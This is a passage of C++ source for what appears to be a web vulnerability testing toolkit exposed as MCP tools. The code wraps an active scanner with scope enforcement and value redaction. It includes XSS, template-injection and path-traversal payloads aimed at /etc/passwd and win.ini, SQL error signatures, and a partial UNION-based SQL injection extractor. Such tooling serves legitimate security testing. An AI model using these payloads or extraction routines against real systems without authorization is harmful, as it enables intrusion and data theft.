#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>

#include "web_vuln_tools_standalone.hpp"

#include "burp/active_scanner.hpp"
#include "burp/audit_http.hpp"
#include "burp/burp_module.hpp"
#include "burp/collaborator.hpp"
#include "burp/insertion_points.hpp"
#include "burp/issue.hpp"
#include "burp/payload_library.hpp"
#include "helpers/diag_log.hpp"
#include "standalone_compat.hpp"

#include <algorithm>
#include <cctype>
#include <cstdint>
#include <cstdlib>
#include <functional>
#include <iomanip>
#include <map>
#include <optional>
#include <regex>
#include <sstream>
#include <string>
#include <utility>
#include <vector>

namespace web_vuln_tools {
namespace {

using json = nlohmann::json;
using tool_result_t = mcp_standalone::tool_result_t;
using exchange_t = aida::burp::exchange_observed_t;

struct header_t
{
    std::string name;
    std::string value;
};

struct target_url_t
{
    std::string scheme;
    std::string host;
    std::string host_for_header;
    std::uint16_t port = 0;
    std::string path_query;
    std::string path_only;
    std::string query;
    bool tls = false;
};

struct prepared_request_t
{
    target_url_t target;
    std::string method = "GET";
    std::vector<header_t> headers;
    std::string body;
    std::string content_type;
    bool scope_only = true;
    bool follow_redirects = false;
    int timeout_ms = 8000;
};

struct mutation_t
{
    std::string path_query;
    std::string body;
    std::string content_type;
    std::string location;
    bool inserted = false;
};

struct send_result_t
{
    bool ok = false;
    exchange_t exchange;
    std::string error;
};

std::string lower_ascii(std::string s)
{
    std::transform(s.begin(), s.end(), s.begin(), [](unsigned char c) { return static_cast<char>(std::tolower(c)); });
    return s;
}

std::string upper_ascii(std::string s)
{
    std::transform(s.begin(), s.end(), s.begin(), [](unsigned char c) { return static_cast<char>(std::toupper(c)); });
    return s;
}

std::string trim_copy(const std::string& s)
{
    size_t a = 0;
    while (a < s.size() && std::isspace(static_cast<unsigned char>(s[a]))) ++a;
    size_t b = s.size();
    while (b > a && std::isspace(static_cast<unsigned char>(s[b - 1]))) --b;
    return s.substr(a, b - a);
}

bool contains_ci(const std::string& haystack, const std::string& needle)
{
    return lower_ascii(haystack).find(lower_ascii(needle)) != std::string::npos;
}

bool starts_with_ci(const std::string& s, const std::string& prefix)
{
    if (prefix.size() > s.size()) return false;
    for (size_t i = 0; i < prefix.size(); ++i) {
        if (std::tolower(static_cast<unsigned char>(s[i])) != std::tolower(static_cast<unsigned char>(prefix[i])))
            return false;
    }
    return true;
}

std::uint64_t now_ms()
{
    return static_cast<std::uint64_t>(GetTickCount64());
}

std::uint64_t fnv1a_bytes(const std::uint8_t* data, size_t size)
{
    std::uint64_t h = 1469598103934665603ULL;
    for (size_t i = 0; i < size; ++i) {
        h ^= static_cast<std::uint64_t>(data[i]);
        h *= 1099511628211ULL;
    }
    return h;
}

std::uint64_t fnv1a_string(const std::string& s)
{
    return fnv1a_bytes(reinterpret_cast<const std::uint8_t*>(s.data()), s.size());
}

std::string hex_u64(std::uint64_t v)
{
    std::ostringstream os;
    os << "0x" << std::hex << std::uppercase << std::setw(16) << std::setfill('0') << v;
    return os.str();
}

std::string hash_string(const std::string& s)
{
    return hex_u64(fnv1a_string(s));
}

std::string hash_bytes(const std::vector<std::uint8_t>& v)
{
    return hex_u64(v.empty() ? fnv1a_string(std::string()) : fnv1a_bytes(v.data(), v.size()));
}

bool call_expired()
{
    if (mcp_standalone::current_call_cancelled())
        return true;
    const std::uint64_t deadline = mcp_standalone::current_call_deadline_ms();
    return deadline != 0 && now_ms() >= deadline;
}

void bounded_sleep_ms(int total_ms)
{
    int remaining = std::max(0, total_ms);
    while (remaining > 0 && !call_expired()) {
        const int slice = std::min(remaining, 100);
        Sleep(static_cast<DWORD>(slice));
        remaining -= slice;
    }
}

int clamp_int_param(const json& p, const char* name, int def, int min_v, int max_v)
{
    int value = def;
    if (p.contains(name)) {
        const auto& v = p[name];
        if (v.is_number_integer()) value = v.get<int>();
        else if (v.is_number_unsigned()) value = static_cast<int>(std::min<std::uint64_t>(v.get<std::uint64_t>(), static_cast<std::uint64_t>(max_v)));
    }
    value = std::max(min_v, std::min(max_v, value));
    const std::uint64_t deadline = mcp_standalone::current_call_deadline_ms();
    if (deadline != 0) {
        const std::uint64_t now = now_ms();
        if (deadline <= now) return 1;
        value = std::min<int>(value, static_cast<int>(std::min<std::uint64_t>(deadline - now, static_cast<std::uint64_t>(max_v))));
        value = std::max(value, 1);
    }
    return value;
}

bool bool_param(const json& p, const char* name, bool def)
{
    return p.contains(name) && p[name].is_boolean() ? p[name].get<bool>() : def;
}

std::string string_param(const json& p, const char* name, const std::string& def = std::string())
{
    return p.contains(name) && p[name].is_string() ? p[name].get<std::string>() : def;
}

tool_result_t param_error(const std::string& message, const std::string& parameter, const std::string& code = "invalid_param")
{
    json d;
    d["success"] = false;
    d["parameter"] = parameter;
    d["code"] = code;
    return tool_result_t::error(message, code, d);
}

bool is_sensitive_name(const std::string& name)
{
    const std::string n = lower_ascii(name);
    static const char* markers[] = {
        "authorization", "cookie", "token", "secret", "password", "passwd", "pwd", "api_key",
        "apikey", "access_key", "private", "credential", "session", "license", "bearer", "jwt",
        "oauth", "refresh", "csrf", "xsrf", "authenticity"
    };
    for (const char* marker : markers) {
        if (n.find(marker) != std::string::npos)
            return true;
    }
    return false;
}

std::string printable_header_name(std::string s)
{
    for (char& c : s) {
        const unsigned char uc = static_cast<unsigned char>(c);
        if (uc <= 0x20 || uc >= 0x7F || c == ':')
            c = '_';
    }
    return s;
}

std::string printable_header_value(std::string s)
{
    for (char& c : s) {
        const unsigned char uc = static_cast<unsigned char>(c);
        if (uc < 0x20 || uc == 0x7F)
            c = ' ';
    }
    return s;
}

bool header_name_equals(const std::string& a, const std::string& b)
{
    return lower_ascii(a) == lower_ascii(b);
}

bool parse_headers(const json& params, std::vector<header_t>& out, std::string& err)
{
    if (!params.contains("headers"))
        return true;
    const json* src = &params["headers"];
    json parsed;
    if (src->is_string()) {
        try {
            parsed = json::parse(src->get<std::string>());
            src = &parsed;
        } catch (...) {
            err = "headers string must contain a JSON object or array";
            return false;
        }
    }
    if (src->is_object()) {
        for (auto it = src->begin(); it != src->end(); ++it) {
            if (!it.value().is_string()) {
                err = "headers object values must be strings";
                return false;
            }
            const std::string name = trim_copy(it.key());
            const std::string value = it.value().get<std::string>();
            if (name.empty() || name.find('\r') != std::string::npos || name.find('\n') != std::string::npos ||
                value.find('\r') != std::string::npos || value.find('\n') != std::string::npos) {
                err = "headers must not contain CR/LF";
                return false;
            }
            out.push_back({name, value});
        }
        return true;
    }
    if (src->is_array()) {
        for (const auto& item : *src) {
            if (item.is_array() && item.size() == 2 && item[0].is_string() && item[1].is_string()) {
                const std::string name = trim_copy(item[0].get<std::string>());
                const std::string value = item[1].get<std::string>();
                if (name.empty() || name.find('\r') != std::string::npos || name.find('\n') != std::string::npos ||
                    value.find('\r') != std::string::npos || value.find('\n') != std::string::npos) {
                    err = "headers must not contain CR/LF";
                    return false;
                }
                out.push_back({name, value});
                continue;
            }
            if (item.is_object() && item.contains("name") && item["name"].is_string() &&
                item.contains("value") && item["value"].is_string()) {
                const std::string name = trim_copy(item["name"].get<std::string>());
                const std::string value = item["value"].get<std::string>();
                if (name.empty() || name.find('\r') != std::string::npos || name.find('\n') != std::string::npos ||
                    value.find('\r') != std::string::npos || value.find('\n') != std::string::npos) {
                    err = "headers must not contain CR/LF";
                    return false;
                }
                out.push_back({name, value});
                continue;
            }
            err = "headers array entries must be [name,value] or {name,value}";
            return false;
        }
        return true;
    }
    err = "headers must be an object, array, or JSON string";
    return false;
}

std::optional<std::string> header_value(const std::vector<std::pair<std::string, std::string>>& headers, const std::string& name)
{
    for (const auto& h : headers) {
        if (header_name_equals(h.first, name))
            return h.second;
    }
    return std::nullopt;
}

std::vector<std::string> header_values(const std::vector<std::pair<std::string, std::string>>& headers, const std::string& name)
{
    std::vector<std::string> out;
    for (const auto& h : headers) {
        if (header_name_equals(h.first, name))
            out.push_back(h.second);
    }
    return out;
}

void set_header(std::vector<header_t>& headers, const std::string& name, const std::string& value)
{
    for (auto& h : headers) {
        if (header_name_equals(h.name, name)) {
            h.value = value;
            return;
        }
    }
    headers.push_back({name, value});
}

std::string url_decode_light(const std::string& s)
{
    std::string out;
    out.reserve(s.size());
    for (size_t i = 0; i < s.size(); ++i) {
        if (s[i] == '%' && i + 2 < s.size() && std::isxdigit(static_cast<unsigned char>(s[i + 1])) && std::isxdigit(static_cast<unsigned char>(s[i + 2]))) {
            const std::string hex = s.substr(i + 1, 2);
            char* end = nullptr;
            long v = std::strtol(hex.c_str(), &end, 16);
            if (end && *end == '\0') {
                out.push_back(static_cast<char>(v & 0xFF));
                i += 2;
                continue;
            }
        }
        if (s[i] == '+') out.push_back(' ');
        else out.push_back(s[i]);
    }
    return out;
}

bool parse_target_url(const std::string& input, target_url_t& out, std::string& err)
{
    std::string url = trim_copy(input);
    if (url.empty()) {
        err = "url is required";
        return false;
    }
    if (url.size() > 8192) {
        err = "url exceeds 8192 bytes";
        return false;
    }
    const size_t frag = url.find('#');
    if (frag != std::string::npos)
        url.resize(frag);
    const size_t sep = url.find("://");
    if (sep == std::string::npos) {
        err = "url must include http:// or https://";
        return false;
    }
    out.scheme = lower_ascii(url.substr(0, sep));
    if (out.scheme != "http" && out.scheme != "https") {
        err = "url scheme must be http or https";
        return false;
    }
    out.tls = out.scheme == "https";
    const size_t authority_start = sep + 3;
    const size_t slash = url.find('/', authority_start);
    std::string authority = slash == std::string::npos ? url.substr(authority_start) : url.substr(authority_start, slash - authority_start);
    out.path_query = slash == std::string::npos ? "/" : url.substr(slash);
    if (out.path_query.empty()) out.path_query = "/";
    if (out.path_query.front() != '/') out.path_query.insert(out.path_query.begin(), '/');
    if (authority.empty()) {
        err = "url host is empty";
        return false;
    }
    if (authority.find('@') != std::string::npos) {
        err = "url userinfo is not accepted";
        return false;
    }
    std::string host;
    std::string port_text;
    if (authority.front() == '[') {
        const size_t end = authority.find(']');
        if (end == std::string::npos) {
            err = "invalid IPv6 host";
            return false;
        }
        host = authority.substr(1, end - 1);
        if (end + 1 < authority.size()) {
            if (authority[end + 1] != ':') {
                err = "invalid authority after IPv6 host";
                return false;
            }
            port_text = authority.substr(end + 2);
        }
    } else {
        const size_t colon = authority.rfind(':');
        if (colon != std::string::npos && authority.find(':') == colon) {
            host = authority.substr(0, colon);
            port_text = authority.substr(colon + 1);
        } else {
            host = authority;
        }
    }
    host = trim_copy(host);
    if (host.empty() || host.size() > 253) {
        err = "invalid host length";
        return false;
    }
    out.host = host;
    out.port = out.tls ? 443 : 80;
    if (!port_text.empty()) {
        char* end = nullptr;
        unsigned long port_ul = std::strtoul(port_text.c_str(), &end, 10);
        if (!end || *end != '\0' || port_ul == 0 || port_ul > 65535) {
            err = "invalid url port";
            return false;
        }
        out.port = static_cast<std::uint16_t>(port_ul);
    }
    out.host_for_header = out.host.find(':') != std::string::npos ? "[" + out.host + "]" : out.host;
    if ((out.tls && out.port != 443) || (!out.tls && out.port != 80))
        out.host_for_header += ":" + std::to_string(out.port);
    const size_t q = out.path_query.find('?');
    out.path_only = q == std::string::npos ? out.path_query : out.path_query.substr(0, q);
    out.query = q == std::string::npos ? std::string() : out.path_query.substr(q + 1);
    if (out.path_only.empty()) out.path_only = "/";
    return true;
}

std::string redacted_query(const std::string& query)
{
    if (query.empty())
        return std::string();
    std::stringstream ss(query);
    std::string item;
    std::string out;
    bool first = true;
    while (std::getline(ss, item, '&')) {
        const size_t eq = item.find('=');
        std::string name = eq == std::string::npos ? item : item.substr(0, eq);
        name = url_decode_light(name);
        if (!first) out += "&";
        first = false;
        out += name.empty() ? "param" : name;
        out += "=<redacted>";
    }
    return out;
}

std::string redacted_url(const target_url_t& t, const std::string& path_query_override = std::string())
{
    std::string path_query = path_query_override.empty() ? t.path_query : path_query_override;
    const size_t q = path_query.find('?');
    std::string path = q == std::string::npos ? path_query : path_query.substr(0, q);
    std::string query = q == std::string::npos ? std::string() : path_query.substr(q + 1);
    std::string out = t.scheme + "://" + t.host_for_header + (path.empty() ? "/" : path);
    if (!query.empty())
        out += "?" + redacted_query(query);
    return out;
}

bool query_has_param(const std::string& query, const std::string& param)
{
    std::stringstream ss(query);
    std::string item;
    while (std::getline(ss, item, '&')) {
        const size_t eq = item.find('=');
        const std::string name = url_decode_light(eq == std::string::npos ? item : item.substr(0, eq));
        if (name == param)
            return true;
    }
    return false;
}

std::string replace_param_encoded_list(const std::string& input, const std::string& param, const std::string& payload, bool& replaced)
{
    std::stringstream ss(input);
    std::string item;
    std::string out;
    bool first = true;
    while (std::getline(ss, item, '&')) {
        const size_t eq = item.find('=');
        const std::string raw_name = eq == std::string::npos ? item : item.substr(0, eq);
        const std::string decoded = url_decode_light(raw_name);
        if (!first) out += "&";
        first = false;
        if (decoded == param) {
            out += raw_name.empty() ? aida::burp::insertion_points::url_encode(param) : raw_name;
            out += "=";
            out += aida::burp::insertion_points::url_encode(payload);
            replaced = true;
        } else {
            out += item;
        }
    }
    if (!replaced) {
        if (!out.empty()) out += "&";
        out += aida::burp::insertion_points::url_encode(param);
        out += "=";
        out += aida::burp::insertion_points::url_encode(payload);
    }
    return out;
}

std::string mutate_query(const std::string& path_query, const std::string& param, const std::string& payload, bool& replaced)
{
    const size_t q = path_query.find('?');
    std::string path = q == std::string::npos ? path_query : path_query.substr(0, q);
    std::string query = q == std::string::npos ? std::string() : path_query.substr(q + 1);
    if (path.empty()) path = "/";
    replaced = false;
    return path + "?" + replace_param_encoded_list(query, param, payload, replaced);
}

bool body_looks_json(const std::string& body)
{
    const std::string t = trim_copy(body);
    return !t.empty() && (t.front() == '{' || t.front() == '[');
}

bool mutate_json_body(const std::string& body, const std::string& param, const std::string& payload, std::string& out)
{
    try {
        json doc = body.empty() ? json::object() : json::parse(body);
        if (!doc.is_object())
            return false;
        doc[param] = payload;
        out = doc.dump();
        return true;
    } catch (...) {
        return false;
    }
}

bool form_has_param(const std::string& body, const std::string& param)
{
    std::stringstream ss(body);
    std::string item;
    while (std::getline(ss, item, '&')) {
        const size_t eq = item.find('=');
        if (url_decode_light(eq == std::string::npos ? item : item.substr(0, eq)) == param)
            return true;
    }
    return false;
}

std::string infer_content_type(const prepared_request_t& r)
{
    if (!r.content_type.empty())
        return r.content_type;
    for (const auto& h : r.headers) {
        if (header_name_equals(h.name, "Content-Type"))
            return h.value;
    }
    if (!r.body.empty() && body_looks_json(r.body))
        return "application/json";
    if (!r.body.empty())
        return "application/x-www-form-urlencoded";
    return std::string();
}

bool prepare_request(const json& params, prepared_request_t& out, std::string& err, const std::string& default_method = "GET")
{
    if (!params.contains("url") || !params["url"].is_string()) {
        err = "url is required";
        return false;
    }
    if (!parse_target_url(params["url"].get<std::string>(), out.target, err))
        return false;
    out.method = upper_ascii(string_param(params, "method", default_method));
    if (out.method.empty())
        out.method = default_method;
    if (out.method.size() > 32) {
        err = "method is too long";
        return false;
    }
    for (unsigned char c : out.method) {
        if (!std::isalnum(c) && c != '!' && c != '#' && c != '$' && c != '%' && c != '&' && c != '\'' &&
            c != '*' && c != '+' && c != '-' && c != '.' && c != '^' && c != '_' && c != '`' && c != '|' && c != '~') {
            err = "method contains invalid characters";
            return false;
        }
    }
    if (!parse_headers(params, out.headers, err))
        return false;
    if (params.contains("body") && params["body"].is_string()) {
        out.body = params["body"].get<std::string>();
        if (out.body.size() > 65536) {
            err = "body exceeds 65536 bytes";
            return false;
        }
    }
    out.content_type = string_param(params, "content_type");
    out.scope_only = bool_param(params, "scope_only", true);
    out.follow_redirects = bool_param(params, "follow_redirects", false);
    out.timeout_ms = clamp_int_param(params, "timeout_ms", 8000, 500, 30000);
    return true;
}

std::string choose_param_location(const prepared_request_t& r, const std::string& param, const json& params)
{
    std::string requested = lower_ascii(string_param(params, "param_location", "auto"));
    if (requested == "query" || requested == "body" || requested == "json")
        return requested;
    if (query_has_param(r.target.query, param))
        return "query";
    const std::string ct = lower_ascii(infer_content_type(r));
    if (ct.find("json") != std::string::npos && body_looks_json(r.body))
        return "json";
    if (form_has_param(r.body, param) || r.method == "POST" || r.method == "PUT" || r.method == "PATCH")
        return "body";
    return "query";
}

mutation_t mutate_request_param(const prepared_request_t& r, const std::string& param, const std::string& payload, const json& params)
{
    mutation_t m;
    m.path_query = r.target.path_query;
    m.body = r.body;
    m.content_type = infer_content_type(r);
    m.location = choose_param_location(r, param, params);
    bool replaced = false;
    if (m.location == "query") {
        m.path_query = mutate_query(r.target.path_query, param, payload, replaced);
        m.inserted = !replaced;
        return m;
    }
    if (m.location == "json") {
        std::string out;
        if (mutate_json_body(r.body, param, payload, out)) {
            m.body = out;
            m.content_type = "application/json";
            m.inserted = true;
            return m;
        }
        m.location = "body";
    }
    m.body = replace_param_encoded_list(r.body, param, payload, replaced);
    m.content_type = "application/x-www-form-urlencoded";
    m.inserted = !replaced;
    return m;
}

bool should_skip_request_header(const std::string& name)
{
    return header_name_equals(name, "Host") || header_name_equals(name, "Content-Length") ||
           header_name_equals(name, "Connection") || header_name_equals(name, "Accept-Encoding");
}

std::vector<std::uint8_t> build_raw_request(const prepared_request_t& r,
                                            const std::string& path_query,
                                            const std::string& body,
                                            const std::string& content_type,
                                            const std::vector<header_t>& extra_headers = {})
{
    std::vector<header_t> headers = r.headers;
    for (const auto& h : extra_headers)
        set_header(headers, h.name, h.value);
    bool has_user_agent = false;
    bool has_accept = false;
    bool has_content_type = false;
    for (const auto& h : headers) {
        if (header_name_equals(h.name, "User-Agent")) has_user_agent = true;
        if (header_name_equals(h.name, "Accept")) has_accept = true;
        if (header_name_equals(h.name, "Content-Type")) has_content_type = true;
    }
    std::string req;
    req.reserve(r.method.size() + path_query.size() + body.size() + 512);
    req += r.method;
    req += " ";
    req += path_query.empty() ? "/" : path_query;
    req += " HTTP/1.1\r\nHost: ";
    req += printable_header_value(r.target.host_for_header);
    req += "\r\n";
    if (!has_user_agent)
        req += "User-Agent: AiDA-WebVuln/1.0\r\n";
    if (!has_accept)
        req += "Accept: */*\r\n";
    req += "Accept-Encoding: identity\r\n";
    for (const auto& h : headers) {
        if (should_skip_request_header(h.name))
            continue;
        if (header_name_equals(h.name, "Content-Type") && !content_type.empty())
            continue;
        req += printable_header_name(h.name);
        req += ": ";
        req += printable_header_value(h.value);
        req += "\r\n";
    }
    if (!body.empty() || r.method == "POST" || r.method == "PUT" || r.method == "PATCH") {
        if (!content_type.empty() && !has_content_type) {
            req += "Content-Type: ";
            req += printable_header_value(content_type);
            req += "\r\n";
        } else if (!content_type.empty()) {
            req += "Content-Type: ";
            req += printable_header_value(content_type);
            req += "\r\n";
        }
        req += "Content-Length: ";
        req += std::to_string(body.size());
        req += "\r\n";
    }
    req += "Connection: close\r\n\r\n";
    req += body;
    return std::vector<std::uint8_t>(req.begin(), req.end());
}

send_result_t send_raw(const prepared_request_t& r,
                       const std::string& path_query,
                       const std::string& body,
                       const std::string& content_type,
                       const std::vector<header_t>& extra_headers = {},
                       const char* source = "web_vuln")
{
    send_result_t out;
    if (call_expired()) {
        out.error = "MCP call cancelled or deadline exceeded";
        return out;
    }
    auto raw = build_raw_request(r, path_query, body, content_type, extra_headers);
    aida::burp::audit_http::send_options_t opt;
    opt.timeout_ms = r.timeout_ms;
    opt.follow_redirects = r.follow_redirects;
    opt.max_redirects = 3;
    opt.enforce_scope = r.scope_only;
    opt.publish_exchange = true;
    opt.exchange_source = source ? source : "web_vuln";
    auto ex = aida::burp::audit_http::send(raw, r.target.host, r.target.port, r.target.tls, opt);
    if (!ex.has_value()) {
        out.error = aida::burp::audit_http::last_error();
        if (out.error.empty())
            out.error = "HTTP request failed";
        return out;
    }
    out.ok = true;
    out.exchange = std::move(*ex);
    return out;
}

send_result_t send_with_param(const prepared_request_t& r,
                              const std::string& param,
                              const std::string& payload,
                              const json& params,
                              mutation_t* out_mutation = nullptr,
                              const std::vector<header_t>& extra_headers = {})
{
    mutation_t m = mutate_request_param(r, param, payload, params);
    if (out_mutation)
        *out_mutation = m;
    return send_raw(r, m.path_query, m.body, m.content_type, extra_headers);
}

std::string body_string(const exchange_t& ex)
{
    if (ex.resp_body.empty())
        return std::string();
    return std::string(reinterpret_cast<const char*>(ex.resp_body.data()), ex.resp_body.size());
}

json response_summary(const exchange_t& ex)
{
    json h;
    auto ct = header_value(ex.resp_headers, "Content-Type");
    if (ct.has_value())
        h["content_type"] = printable_header_value(*ct);
    auto loc = header_value(ex.resp_headers, "Location");
    if (loc.has_value()) {
        target_url_t parsed;
        std::string err;
        if (parse_target_url(*loc, parsed, err))
            h["location"] = redacted_url(parsed);
        else
            h["location_hash"] = hash_string(*loc);
    }
    size_t set_cookie_count = 0;
    for (const auto& entry : ex.resp_headers) {
        if (header_name_equals(entry.first, "Set-Cookie"))
            ++set_cookie_count;
    }
    if (set_cookie_count != 0)
        h["set_cookie_count"] = set_cookie_count;
    json out;
    out["exchange_id"] = ex.id;
    out["status_code"] = ex.status_code;
    out["reason"] = ex.reason_phrase;
    out["latency_ms"] = ex.latency_ms;
    out["body_length"] = ex.resp_body.size();
    out["body_hash"] = hash_bytes(ex.resp_body);
    out["headers"] = h;
    return out;
}

json request_summary(const prepared_request_t& r, const std::string& path_query)
{
    json out;
    out["method"] = r.method;
    out["target"] = redacted_url(r.target, path_query);
    out["scope_only"] = r.scope_only;
    out["timeout_ms"] = r.timeout_ms;
    return out;
}

json issue_summary_json(const aida::burp::issue_t& issue)
{
    json out;
    out["id"] = issue.id;
    out["type_key"] = issue.type_key;
    out["name"] = issue.name;
    out["severity"] = aida::burp::severity_label(issue.severity);
    out["confidence"] = aida::burp::confidence_label(issue.confidence);
    out["host"] = issue.host;
    out["path"] = issue.path;
    out["parameter"] = issue.parameter;
    out["insertion_point"] = issue.insertion_point;
    out["evidence_count"] = issue.evidence.size();
    out["audit_id"] = issue.audit_id;
    return out;
}

json list_issues_for_audit(std::uint64_t audit_id)
{
    aida::burp::issue_store::initialize();
    aida::burp::issue_filter_t filter;
    filter.has_audit_id = true;
    filter.audit_id = audit_id;
    auto issues = aida::burp::issue_store::list(filter);
    json arr = json::array();
    for (const auto& issue : issues)
        arr.push_back(issue_summary_json(issue));
    return arr;
}

json scanner_status_json(const aida::burp::active_scanner::audit_status_t& st)
{
    json out;
    out["audit_id"] = st.id;
    out["running"] = st.running;
    out["cancelled"] = st.cancelled;
    out["cancel_requested"] = st.cancel_requested;
    out["drained"] = st.drained;
    out["total_points"] = st.total_points;
    out["total_probes"] = st.total_probes;
    out["completed_probes"] = st.completed_probes;
    out["issues_found"] = st.issues_found;
    out["responses_received"] = st.responses_received;
    out["transport_failures"] = st.transport_failures;
    out["no_response_count"] = st.no_response_count;
    out["transport_error_class"] = st.transport_error_class;
    out["transport_error_code"] = st.transport_error_code;
    out["last_transport_error"] = st.last_transport_error;
    return out;
}

tool_result_t run_scanner_wrapper(const json& params,
                                  const std::vector<std::string>& modules,
                                  const std::string& default_method,
                                  const char* tag)
{
    aida::burp::initialize();
    prepared_request_t r;
    std::string err;
    if (!prepare_request(params, r, err, default_method))
        return param_error(err, "url");
    std::string path_query = r.target.path_query;
    std::string body = r.body;
    std::string content_type = infer_content_type(r);
    std::string param = string_param(params, "param_name");
    std::string location;
    if (!param.empty()) {
        const std::string original = string_param(params, "original_value", "1");
        mutation_t m = mutate_request_param(r, param, original, params);
        path_query = m.path_query;
        body = m.body;
        content_type = m.content_type;
        location = m.location;
    }
    std::vector<std::uint8_t> raw = build_raw_request(r, path_query, body, content_type);
    aida::burp::active_scanner::audit_config_t cfg;
    cfg.scope_only = r.scope_only;
    cfg.enabled_modules = modules;
    cfg.timeout_ms = r.timeout_ms;
    cfg.follow_redirects = bool_param(params, "follow_redirects", false);
    cfg.per_module_request_cap = static_cast<size_t>(clamp_int_param(params, "per_module_request_cap", 24, 1, 96));
    cfg.max_concurrent_requests = static_cast<size_t>(clamp_int_param(params, "max_concurrent", 4, 1, 16));
    cfg.max_concurrent_explicit = true;
    cfg.request_throttle_ms = static_cast<size_t>(clamp_int_param(params, "throttle_ms", 0, 0, 5000));
    cfg.request_throttle_explicit = params.contains("throttle_ms");
    std::string scan_url = r.target.scheme + "://" + r.target.host_for_header + r.target.path_only;
    diag::log_tagged_fmt("web_vuln", "scanner_wrapper_begin tag=%s host=%s port=%u modules=%zu scope_only=%d req_len=%zu",
        tag ? tag : "scanner", r.target.host.c_str(), static_cast<unsigned>(r.target.port), modules.size(), r.scope_only ? 1 : 0, raw.size());
    const std::uint64_t audit_id = aida::burp::active_scanner::enqueue_target(raw, scan_url, cfg);
    if (audit_id == 0) {
        json d;
        d["request"] = request_summary(r, path_query);
        d["modules"] = modules;
        d["scanner_error"] = aida::burp::active_scanner::last_error();
        d["scanner_error_code"] = aida::burp::active_scanner::last_error_code();
        return tool_result_t::error("scanner audit was not accepted", "scanner_rejected", d);
    }
    const int wait_ms = clamp_int_param(params, "wait_ms", 25000, 0, 60000);
    const std::uint64_t deadline = now_ms() + static_cast<std::uint64_t>(wait_ms);
    bool idle = false;
    while (!call_expired()) {
        const std::uint64_t now = now_ms();
        if (wait_ms == 0 || now >= deadline)
            break;
        const std::uint32_t slice = static_cast<std::uint32_t>(std::min<std::uint64_t>(500, deadline - now));
        if (aida::burp::active_scanner::wait_for_audit_idle(audit_id, slice)) {
            idle = true;
            break;
        }
    }
    bool cancelled = false;
    if (call_expired()) {
        cancelled = aida::burp::active_scanner::cancel_audit(audit_id);
        (void)aida::burp::active_scanner::wait_for_audit_idle(audit_id, 2000);
    }
    aida::burp::active_scanner::audit_status_t st;
    const bool have_status = aida::burp::active_scanner::get_status(audit_id, st);
    json d;
    d["request"] = request_summary(r, path_query);
    d["param_name"] = param;
    d["param_location"] = location;
    d["modules"] = modules;
    d["audit_id"] = audit_id;
    d["idle"] = idle;
    d["cancelled_by_wrapper"] = cancelled;
    if (have_status)
        d["status"] = scanner_status_json(st);
    d["issues"] = list_issues_for_audit(audit_id);
    d["issue_count"] = d["issues"].size();
    d["evidence_summary"] = d["issue_count"].get<size_t>() > 0 ? "issues_recorded" : (have_status && st.responses_received > 0 ? "responses_observed" : "no_response_evidence");
    diag::log_tagged_fmt("web_vuln", "scanner_wrapper_done tag=%s audit_id=%llu issues=%zu idle=%d cancelled=%d",
        tag ? tag : "scanner", static_cast<unsigned long long>(audit_id), d["issue_count"].get<size_t>(), idle ? 1 : 0, cancelled ? 1 : 0);
    return tool_result_t::ok(d["issue_count"].get<size_t>() > 0 ? "scanner issues observed" : "scanner audit completed or queued", d);
}

std::vector<std::string> bounded_payload_entries(const std::string& set_id, size_t max_count)
{
    aida::burp::payloads::initialize();
    auto entries = aida::burp::payloads::entries(set_id, max_count);
    if (!entries.empty())
        return entries;
    return {};
}

json payload_json(const std::vector<std::string>& payloads)
{
    json arr = json::array();
    for (const auto& p : payloads) {
        json item;
        item["value"] = p;
        item["length"] = p.size();
        item["hash"] = hash_string(p);
        arr.push_back(std::move(item));
    }
    return arr;
}

std::vector<std::string> xss_payloads(size_t max_count)
{
    auto p = bounded_payload_entries("xss/polyglot", max_count);
    if (p.size() < max_count) {
        auto q = bounded_payload_entries("xss/standard", max_count - p.size());
        p.insert(p.end(), q.begin(), q.end());
    }
    if (p.empty())
        p = {"\"><svg onload=alert(1)>", "'><img src=x onerror=alert(1)>", "<script>alert(1)</script>"};
    if (p.size() > max_count)
        p.resize(max_count);
    return p;
}

std::vector<std::string> ssti_payloads(size_t max_count)
{
    auto p = bounded_payload_entries("ssti/all-engines", max_count);
    if (p.empty())
        p = {"{{7*7}}", "${7*7}", "<%= 7*7 %>", "${{7*7}}", "#{7*7}"};
    if (p.size() > max_count)
        p.resize(max_count);
    return p;
}

std::vector<std::string> traversal_payloads(const std::string& platform, size_t max_count)
{
    std::vector<std::string> p;
    if (platform == "windows" || platform == "all") {
        auto w = bounded_payload_entries("lfi/windows", max_count);
        p.insert(p.end(), w.begin(), w.end());
    }
    if (platform != "windows") {
        auto u = bounded_payload_entries("lfi/unix", max_count > p.size() ? max_count - p.size() : 0);
        p.insert(p.end(), u.begin(), u.end());
    }
    if (p.empty())
        p = {"../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini", "/etc/passwd", "C:\\Windows\\win.ini"};
    if (p.size() > max_count)
        p.resize(max_count);
    return p;
}

tool_result_t tool_sqli_detect(const json& params)
{
    return run_scanner_wrapper(params, {"sqli"}, "GET", "sqli.detect");
}

bool response_has_sql_error(const std::string& body, std::vector<std::string>& labels)
{
    static const std::pair<const char*, const char*> pats[] = {
        {"mysql", "you have an error in your sql syntax"},
        {"mysql", "warning: mysql"},
        {"postgres", "postgresql query failed"},
        {"postgres", "unterminated quoted string"},
        {"mssql", "microsoft ole db provider for sql server"},
        {"mssql", "unclosed quotation mark after the character string"},
        {"oracle", "ora-01756"},
        {"sqlite", "sqlite error"},
        {"generic", "sql syntax"}
    };
    const std::string l = lower_ascii(body);
    for (const auto& p : pats) {
        if (l.find(p.second) != std::string::npos)
            labels.push_back(p.first);
    }
    return !labels.empty();
}

tool_result_t tool_sqli_union_extract(const json& params)
{
    prepared_request_t r;
    std::string err;
    if (!prepare_request(params, r, err, "GET"))
        return param_error(err, "url");
    const std::string param = string_param(params, "param_name");
    if (param.empty())
        return param_error("param_name is required", "param_name", "missing_required");
    const int max_columns = clamp_int_param(params, "max_columns", 6, 1, 12);
    json attempts = json::array();
    bool found = false;
    for (int cols = 1; cols <= max_columns && !call_expired(); ++cols) {
        std::string select;
        for (int i = 0; i < cols; ++i) {
            if (i) select += ",";
            select += (i == 0 ? "'AIDA_UNION_" + std::to_string(cols) + "'" : "NULL");
        }
        std::string payload = "-1 UNION ALL SELECT " + select + "--";
        mutation_t m;
        auto sr = send_with_param(r, param, payload, params, &m);
        json a;
        a["columns"] = cols;
        a["payload_hash"] = hash_string(payload);
